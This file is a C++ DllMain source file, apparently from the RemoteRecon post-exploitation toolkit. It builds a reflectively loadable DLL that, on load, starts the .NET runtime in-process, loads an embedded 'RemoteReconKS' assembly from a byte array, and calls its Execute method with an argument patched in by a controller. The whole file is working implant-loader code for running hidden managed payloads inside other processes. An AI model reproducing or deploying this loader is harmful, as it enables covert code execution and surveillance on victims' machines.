// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "RemoteReconKS_dll.hpp"
#include "clr.hpp"
#include "ReflectiveLoader.h"


void LoadAndRun(LPVOID lpParam)
{
	clr::ClrDomain domain;
	char* argument = "Replace-Me  "; /*Patched by RemoteReconCore*/

	//Load the RemoteReconKS byte array into a vector
	std::vector<uint8_t> vec(RemoteReconKS_dll, RemoteReconKS_dll + REMOTERECONKS_dll_len);
	//Load the assembly into the app domain
	auto res = domain.load(vec);

	if (!res) {
		exit(0);
	}

	//Call the public static Execute method for the selected module
	res->invoke_static(L"RemoteReconKS.RemoteReconKS", L"Execute", argument);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		//Load and Run the RemoteReconKS assembly once the dll has been loaded
		LoadAndRun(NULL);
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

